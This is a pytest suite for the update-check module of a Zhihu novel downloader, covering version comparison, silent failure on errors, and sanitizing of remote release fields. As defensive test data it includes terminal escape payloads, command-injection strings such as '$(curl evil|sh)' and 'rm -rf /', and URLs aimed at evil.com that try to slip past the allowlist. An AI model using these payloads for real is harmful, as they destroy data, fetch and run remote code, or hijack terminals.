"""update.py 测试（规格 §2.16）：semver 比较矩阵 + 网络异常静默 None。

全部离线：urlopen 一律 monkeypatch 打桩，绝不产生真实请求。
"""

from __future__ import annotations

import json
import sys
from typing import Any

import pytest

from zhihu_downloader import __version__
from zhihu_downloader import update as updater

# ----------------------------------------------------------------------
# 打桩工具
# ----------------------------------------------------------------------


class FakeResponse:
    """最小可用的 urlopen 响应：支持 with 语法与 read()。"""

    def __init__(self, payload: Any) -> None:
        if isinstance(payload, bytes):
            self._body = payload
        elif isinstance(payload, str):
            self._body = payload.encode("utf-8")
        else:
            self._body = json.dumps(payload).encode("utf-8")
        self.closed = False

    def read(self) -> bytes:
        return self._body

    def close(self) -> None:
        self.closed = True

    def __enter__(self) -> FakeResponse:
        return self

    def __exit__(self, *exc: Any) -> bool:
        self.close()
        return False


class UrlopenRecorder:
    """记录请求参数的假 urlopen。"""

    def __init__(self, payload: Any = None, error: BaseException | None = None) -> None:
        self.payload = payload
        self.error = error
        self.requests: list[Any] = []
        self.timeouts: list[Any] = []

    def __call__(self, request: Any, timeout: Any = None) -> FakeResponse:
        self.requests.append(request)
        self.timeouts.append(timeout)
        if self.error is not None:
            raise self.error
        return FakeResponse(self.payload)


#: 合法的发布页 URL（R2 #9b 起 html_url 要过本站 releases 前缀白名单，
#: 夹具必须用可信形态，否则所有用例都在偷偷测"丢弃链接"分支）。
GOOD_URL = "https://github.com/xfengyin/zhihu-salt-novel-downloader/releases/tag/v5.1.0"


def release(tag: str = "v5.1.0", url: str = GOOD_URL) -> dict[str, Any]:
    """构造一份 GitHub releases/latest 响应体。"""
    return {"tag_name": tag, "html_url": url, "name": "Release " + tag}


# ----------------------------------------------------------------------
# 版本归一化与比较矩阵
# ----------------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("v5.1.0", "5.1.0"),
        ("V5.1.0", "5.1.0"),
        ("5.1.0", "5.1.0"),
        ("  v5.1.0  ", "5.1.0"),
        ("5.1.0-rc1", "5.1.0"),
        ("5.1.0+build7", "5.1.0"),
        ("v5.1.0-alpha.1", "5.1.0"),
        ("", ""),
        ("abc", "abc"),
    ],
)
def test_normalize_version(raw: str, expected: str) -> None:
    assert updater.normalize_version(raw) == expected


def test_normalize_version_accepts_none_and_objects() -> None:
    """非字符串输入不得抛异常（升级检查不允许成为崩溃源）。"""
    assert updater.normalize_version(None) == ""
    assert updater.normalize_version(123) == "123"


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("5.1.0", (5, 1, 0)),
        ("v5.1.0", (5, 1, 0)),
        ("5.1", (5, 1)),
        ("5", (5,)),
        ("5.0.x", (5, 0, 0)),
        ("v5.1.0-rc1", (5, 1, 0)),
        ("", ()),
        ("abc", ()),
        ("0.0.0", (0, 0, 0)),
    ],
)
def test_parse_version(raw: str, expected: tuple) -> None:
    assert updater.parse_version(raw) == expected


@pytest.mark.parametrize(
    ("latest", "current", "newer"),
    [
        ("v5.1.0", "5.0.0", True),      # 规格点名的归一化用例
        ("5.1.0", "v5.0.0", True),
        ("v5.10.0", "5.9.0", True),     # 数字比较，不是字符串比较
        ("5.9.0", "5.10.0", False),
        ("5.0.0", "5.0.0", False),      # 相等不提示
        ("v5.0.0", "5.0.0", False),
        ("4.9.9", "5.0.0", False),      # 远端更旧（本地是预发布/手工包）
        ("5.1", "5.1.0", False),        # 补零后相等
        ("5.1.1", "5.1", True),
        ("v5.1.0-rc1", "5.1.0", False),  # 预发布后缀被忽略
        ("abc", "5.0.0", False),        # 非法版本一律不提示
        ("", "5.0.0", False),
        ("v6.0.0", "", False),          # 当前版本非法也不提示（宁缺勿错）
    ],
)
def test_is_newer_matrix(latest: str, current: str, newer: bool) -> None:
    assert updater.is_newer(latest, current) is newer


@pytest.mark.parametrize(
    ("left", "right", "result"),
    [("5.0.1", "5.0.0", 1), ("5.0.0", "5.0.1", -1), ("v5.0.0", "5.0.0", 0), ("x", "5.0.0", 0)],
)
def test_compare_versions(left: str, right: str, result: int) -> None:
    assert updater.compare_versions(left, right) == result


# ----------------------------------------------------------------------
# check_tool_update：成功路径
# ----------------------------------------------------------------------


def test_check_tool_update_returns_dict_with_three_keys(monkeypatch: pytest.MonkeyPatch) -> None:
    recorder = UrlopenRecorder(release(tag="v5.1.0"))
    monkeypatch.setattr(updater, "urlopen", recorder)

    info = updater.check_tool_update("5.0.0")

    assert info is not None
    assert info["latest"] == "v5.1.0"
    assert info["url"] == GOOD_URL, "白名单内的 URL 应原样保留"
    assert info["has_update"] is True


def test_check_tool_update_no_update_when_same_version(monkeypatch: pytest.MonkeyPatch) -> None:
    recorder = UrlopenRecorder(release(tag="v" + __version__))
    monkeypatch.setattr(updater, "urlopen", recorder)

    info = updater.check_tool_update(__version__)

    assert info is not None and info["has_update"] is False


def test_check_tool_update_hits_specified_url_with_10s_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
    """§2.16：固定 GitHub releases/latest 接口 + 10 秒超时 + 非默认 UA。"""
    recorder = UrlopenRecorder(release())
    monkeypatch.setattr(updater, "urlopen", recorder)

    updater.check_tool_update("5.0.0")

    assert len(recorder.requests) == 1
    request = recorder.requests[0]
    assert request.full_url == updater.RELEASES_API_URL
    assert request.full_url == (
        "https://api.github.com/repos/xfengyin/zhihu-salt-novel-downloader/releases/latest"
    )
    assert recorder.timeouts == [updater.REQUEST_TIMEOUT]
    assert updater.REQUEST_TIMEOUT == 10.0
    headers = {k.lower(): v for k, v in request.headers.items()}
    assert "user-agent" in headers and headers["user-agent"] != "Python-urllib/3.11"


def test_check_tool_update_falls_back_to_release_name(monkeypatch: pytest.MonkeyPatch) -> None:
    """没有 tag_name 时用 name 兜底（GitHub 某些响应只有标题）。"""
    recorder = UrlopenRecorder({"name": "v9.9.9", "html_url": "u"})
    monkeypatch.setattr(updater, "urlopen", recorder)

    info = updater.check_tool_update("5.0.0")

    assert info is not None and info["latest"] == "v9.9.9" and info["has_update"] is True


def test_check_tool_update_missing_tag_returns_none(monkeypatch: pytest.MonkeyPatch) -> None:
    recorder = UrlopenRecorder({"html_url": "u"})
    monkeypatch.setattr(updater, "urlopen", recorder)

    assert updater.check_tool_update("5.0.0") is None


def test_check_tool_update_empty_tag_returns_none(monkeypatch: pytest.MonkeyPatch) -> None:
    recorder = UrlopenRecorder({"tag_name": "   ", "html_url": "u"})
    monkeypatch.setattr(updater, "urlopen", recorder)

    assert updater.check_tool_update("5.0.0") is None


def test_check_tool_update_tolerates_missing_html_url(monkeypatch: pytest.MonkeyPatch) -> None:
    recorder = UrlopenRecorder({"tag_name": "v5.1.0"})
    monkeypatch.setattr(updater, "urlopen", recorder)

    info = updater.check_tool_update("5.0.0")

    assert info == {"latest": "v5.1.0", "url": "", "has_update": True}


# ----------------------------------------------------------------------
# check_tool_update：任何异常都静默 None
# ----------------------------------------------------------------------


@pytest.mark.parametrize(
    "error",
    [
        OSError("network down"),
        TimeoutError("timed out"),
        ConnectionResetError("reset by peer"),
        ValueError("unknown url type"),
        UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte"),
        ZeroDivisionError("完全没料到的异常也要兜住"),
        RuntimeError("非预期异常也要兜住"),
    ],
)
def test_check_tool_update_swallows_every_exception(monkeypatch: pytest.MonkeyPatch, error: BaseException) -> None:
    """§2.16：任何异常 -> None（静默），doctor/gui 据此什么都不显示。"""
    monkeypatch.setattr(updater, "urlopen", UrlopenRecorder(error=error))

    assert updater.check_tool_update("5.0.0") is None


def test_keyboard_interrupt_is_not_swallowed(monkeypatch: pytest.MonkeyPatch) -> None:
    """Ctrl+C 必须能穿透升级检查（只兜 Exception，不兜 BaseException）。"""
    monkeypatch.setattr(updater, "urlopen", UrlopenRecorder(error=KeyboardInterrupt()))

    with pytest.raises(KeyboardInterrupt):
        updater.check_tool_update("5.0.0")


@pytest.mark.parametrize(
    ("payload", "expect_none"),
    [
        ("not json at all", True),
        ("", True),
        ("[1, 2, 3]", True),               # 顶层不是对象
        ("null", True),
        ("{\"tag_name\": \"v5.1.0\"}", False),   # 正常
        (b"\xff\xfe binary", True),       # 非 UTF-8 字节（decode 用 replace 后仍非 JSON）
    ],
)
def test_check_tool_update_survives_weird_bodies(monkeypatch: pytest.MonkeyPatch, payload: Any, expect_none: bool) -> None:
    monkeypatch.setattr(updater, "urlopen", UrlopenRecorder(payload))

    result = updater.check_tool_update("5.0.0")
    if expect_none:
        assert result is None
    else:
        assert result is not None and result["latest"] == "v5.1.0"


def test_check_tool_update_non_stringable_tag_is_silent(monkeypatch: pytest.MonkeyPatch) -> None:
    """响应体里 tag_name 是不可字符串化对象时也必须静默，而不是抛异常。"""

    class Boom:
        def __str__(self) -> str:
            raise RuntimeError("nope")

    class BoomResponse(FakeResponse):
        def read(self) -> bytes:
            class Raw(bytes):
                def decode(self, *args: Any, **kwargs: Any) -> str:
                    raise RuntimeError("decode 炸了")

            return Raw(b"{}")

    monkeypatch.setattr(updater, "urlopen", lambda request, timeout=None: BoomResponse())
    assert updater.check_tool_update("5.0.0") is None
    assert Boom is not None


def test_check_tool_update_dict_payload_with_dict_tag(monkeypatch: pytest.MonkeyPatch) -> None:
    """tag_name 是 dict（结构变更）时静默返回 None：不是版本号形状就不提示（R2 #9b）。"""
    monkeypatch.setattr(updater, "urlopen", UrlopenRecorder({"tag_name": {"a": 1}, "html_url": "u"}))

    assert updater.check_tool_update("5.0.0") is None


def test_check_tool_update_never_raises_when_module_state_is_odd(monkeypatch: pytest.MonkeyPatch) -> None:
    """urlopen 被替换成完全不可调用的对象时，也不能把异常抛给主流程。"""
    monkeypatch.setattr(updater, "urlopen", "not callable")

    assert updater.check_tool_update("5.0.0") is None


# ----------------------------------------------------------------------
# R2 #9a：数字炸弹不得抛异常（docstring 自述的"任何异常静默"契约）
# ----------------------------------------------------------------------


@pytest.mark.parametrize("bomb", ["1" * 5000, "1" * 4301, "9" * 20, "5." + "1" * 6000])
def test_parse_version_survives_oversized_digit_runs(bomb: str) -> None:
    """超长数字段必须退化为 0，而不是让 int() 抛 ValueError。

    CPython 对 int(str) 有 4300 位上限（Exceeds the limit (4300 digits)），
    一个畸形/恶意的 tag_name 就能把异常穿出本模块，违反 §2.16 的静默契约。
    """
    parsed = updater.parse_version(bomb)
    assert isinstance(parsed, tuple)
    assert all(isinstance(part, int) for part in parsed)
    assert max(parsed) < 10 ** updater.MAX_VERSION_DIGITS


def test_digit_bomb_does_not_break_comparison() -> None:
    """比较入口同样不能被数字炸弹打穿。"""
    assert updater.compare_versions("1" * 5000, "5.0.0") == -1
    assert updater.is_newer("1" * 5000, "5.0.0") is False
    assert updater.is_newer("5.1.0", "1" * 5000) is True


def test_check_tool_update_survives_digit_bomb_tag(monkeypatch: pytest.MonkeyPatch) -> None:
    """远端 tag 是数字炸弹时：静默降级为无新版，绝不抛异常。"""
    recorder = UrlopenRecorder(release(tag="1" * 5000))
    monkeypatch.setattr(updater, "urlopen", recorder)

    info = updater.check_tool_update("5.0.0")

    assert info is not None
    assert info["has_update"] is False
    assert len(info["latest"]) <= updater.MAX_HINT_TEXT, "超长 tag 应被截断"


def test_unicode_digits_are_not_parsed_as_numbers() -> None:
    """全角数字能过 isdigit() 却过不了 int()：正则必须按 ASCII 判。"""
    assert updater.parse_version("\uff15.\uff11.\uff10") == (0, 0, 0)
    assert updater.parse_version("2\u00b2") == (0,)  # "²".isdigit() 为真但 int() 会炸


# ----------------------------------------------------------------------
# R2 #9b：远端字段是不可信输入 —— 控制台注入与 URL 白名单
# ----------------------------------------------------------------------


@pytest.mark.parametrize(
    ("name", "poison"),
    [
        ("OSC8 伪造可点击链接", chr(27) + "]8;;https://evil.example" + chr(7) + "点我看更新"),
        ("OSC52 写剪贴板", chr(27) + "]52;c;cHduZXJz" + chr(7)),
        ("CSI 清屏", chr(27) + "[2J" + chr(27) + "[H"),
        ("BEL 响铃", "v5.1.0" + chr(7) + "x"),
        ("CR 伪造覆盖行", "5.1" + chr(13) + "9.9"),
        ("LF 伪造多行", "5.1" + chr(10) + "rm -rf /"),
        ("NUL", "5.1" + chr(0)),
        ("C1 控制字符", "5.1" + chr(0x85) + chr(0x9B)),
    ],
)
def test_sanitize_strips_every_control_sequence(name: str, poison: str) -> None:
    """C0/DEL/C1 一律剔除：终端行为不该由远端响应决定（name 便于失败定位）。"""
    clean = updater.sanitize_console_text(poison)
    assert chr(27) not in clean, name
    assert not any(ord(ch) < 0x20 or ord(ch) == 0x7F or 0x80 <= ord(ch) <= 0x9F
                   for ch in clean), name
    assert chr(10) not in clean and chr(13) not in clean, name


def test_sanitize_truncates_and_tolerates_garbage() -> None:
    """长度上限 + 任意输入都不抛。"""
    assert len(updater.sanitize_console_text("x" * 5000)) == updater.MAX_HINT_TEXT
    assert updater.sanitize_console_text("abcdef", limit=3) == "abc"
    assert updater.sanitize_console_text(None) == ""

    class Boom:
        def __str__(self) -> str:
            raise RuntimeError("不可字符串化")

    assert updater.sanitize_console_text(Boom()) == ""


@pytest.mark.parametrize(
    ("tag", "displayed"),
    [
        ("v5.1.0", "v5.1.0"),
        ("5.1.0", "5.1.0"),
        ("5.1.0-rc1", "5.1.0-rc1"),
        ("5.1.0+build7", "5.1.0+build7"),
        ("v5", "v5"),
        ("5", "5"),
        # 以下都不是版本号形状：远端不得决定我们提示里的文案
        ("latest", ""),
        ("v5.1.0\u3000\u70b9\u51fb\u66f4\u65b0", ""),
        ("5.1.0; rm -rf /", ""),
        ("$(curl evil|sh)", ""),
        ("https://evil.example", ""),
        ("v5.1.0" + chr(27) + "]8;;https://evil", ""),
        ("Release v5.1.0", ""),
        ("5." * 30, ""),
    ],
)
def test_safe_version_label_shape_allowlist(tag: str, displayed: str) -> None:
    """版本号形状白名单：只洗掉 ESC 还不够，远端更不能随意决定提示里的那段文本。"""
    assert updater.safe_version_label(tag) == displayed


def test_hint_never_echoes_free_form_remote_text(monkeypatch: pytest.MonkeyPatch) -> None:
    """OSC-8 载荷形态的 tag：整条提示直接消失（旧行为只剩惰性文本，也仍是噪音）。"""
    poison = "v9.9.9" + chr(27) + "]8;;https://evil.example" + chr(7) + "（点此更新）"
    recorder = UrlopenRecorder(release(tag=poison, url="https://evil.example/x"))
    monkeypatch.setattr(updater, "urlopen", recorder)

    assert updater.check_tool_update("5.0.0") is None
    # 就算有人绕过 check_tool_update 直接递脏值进来，渲染层也只剩占位文案。
    hint = updater.format_release_hint({"latest": poison, "url": GOOD_URL,
                                        "has_update": True})
    assert hint == "⬆️ 发现新版本 新版本（升级即可修复已知失效：" + GOOD_URL + "）"


def test_junk_version_can_never_claim_to_be_newer() -> None:
    """位数上限 < 显示长度上限：再长的数字串也解析为 0，不可能自称更新。"""
    assert updater.MAX_VERSION_DIGITS < updater.MAX_VERSION_TEXT
    junk = updater.safe_version_label("1" * 30)
    assert junk == "1" * 30  # 形状合法、只是没有意义
    assert updater.is_newer(junk, "5.0.0") is False
    assert updater.format_release_hint({"latest": junk, "url": GOOD_URL,
                                        "has_update": False}) == ""


@pytest.mark.parametrize(
    ("url", "kept"),
    [
        (GOOD_URL, True),
        (GOOD_URL + "?expanded=1", True),
        ("https://github.com/xfengyin/zhihu-salt-novel-downloader/releases/latest", True),
        ("http://github.com/xfengyin/zhihu-salt-novel-downloader/releases/tag/v1", False),
        ("https://evil.com/x", False),
        ("https://github.com/xfengyin/zhihu-salt-novel-downloader/releases.evil.com/x", False),
        ("https://github.com@evil.com/xfengyin/zhihu-salt-novel-downloader/releases/tag/v1", False),
        ("https://evil.com/#https://github.com/xfengyin/zhihu-salt-novel-downloader/releases/tag/v1", False),
        ("https://github.com:8443/xfengyin/zhihu-salt-novel-downloader/releases/tag/v1", False),
        ("https://github.com:abc/xfengyin/zhihu-salt-novel-downloader/releases/tag/v1", False),
        (GOOD_URL + chr(27) + "]52;c;AAAA", False),
        ("https://github.com/xfengyin/zhihu-salt-novel-downloader/releases/" + chr(10) + "tag/v1", False),
        ("", False),
        (None, False),
    ],
)
def test_safe_release_url_allowlist(url: Any, kept: bool) -> None:
    """只有本站 releases 路径进白名单；含控制字符的 URL 整体丢弃而不是洗白修复。"""
    out = updater.safe_release_url(url)
    if kept:
        assert out == url
    else:
        assert out == "", url
    assert chr(27) not in out


def test_hint_never_emits_escape_bytes_even_from_latest() -> None:
    """latest 同样受远端控制：整行提示不得含 ESC，且必须仍是一行。"""
    info = {"latest": "5.1" + chr(27) + "]8;;https://evil" + chr(7) + "0",
            "url": GOOD_URL + chr(27) + "[2J", "has_update": True}
    hint = updater.format_release_hint(info)
    assert chr(27) not in hint and chr(7) not in hint
    assert chr(10) not in hint and chr(13) not in hint
    assert GOOD_URL not in hint, "被污染的 URL 应整体丢弃而非修复后再显示"
    assert "发现新版本" in hint


def test_hint_drops_foreign_url_but_stays_useful() -> None:
    """链接不合法时退回不带链接的提示，不显示任何外部域名。"""
    hint = updater.format_release_hint(
        {"latest": "v5.1.0", "url": "https://evil.example/rel", "has_update": True})
    assert "evil.example" not in hint and "发布页" in hint and "v5.1.0" in hint


def test_check_tool_update_drops_foreign_url(monkeypatch: pytest.MonkeyPatch) -> None:
    """白名单在 check_tool_update 这一层就已生效（下游拿不到脏 URL）。"""
    recorder = UrlopenRecorder(release(url="https://evil.example/rel"))
    monkeypatch.setattr(updater, "urlopen", recorder)
    info = updater.check_tool_update("5.0.0")
    assert info is not None and info["url"] == ""
    assert "evil" not in updater.format_release_hint(info)


# ----------------------------------------------------------------------
# 渲染：一行提示
# ----------------------------------------------------------------------


def test_format_release_hint_only_when_has_update() -> None:
    assert updater.format_release_hint(None) == ""
    assert updater.format_release_hint({"latest": "v5.1.0", "url": "u", "has_update": False}) == ""
    hint = updater.format_release_hint({"latest": "v5.1.0", "url": GOOD_URL, "has_update": True})
    assert "v5.1.0" in hint and GOOD_URL in hint
    assert chr(10) not in hint  # 必须是一行


def test_format_release_hint_without_url_still_readable() -> None:
    hint = updater.format_release_hint({"latest": "v5.1.0", "url": "", "has_update": True})
    assert hint.startswith("⬆") and "v5.1.0" in hint


def test_update_module_is_importable_without_network() -> None:
    """import 阶段不得有任何副作用（不发请求、不写文件）。"""
    assert "zhihu_downloader.update" in sys.modules
    assert updater.check_tool_update.__doc__
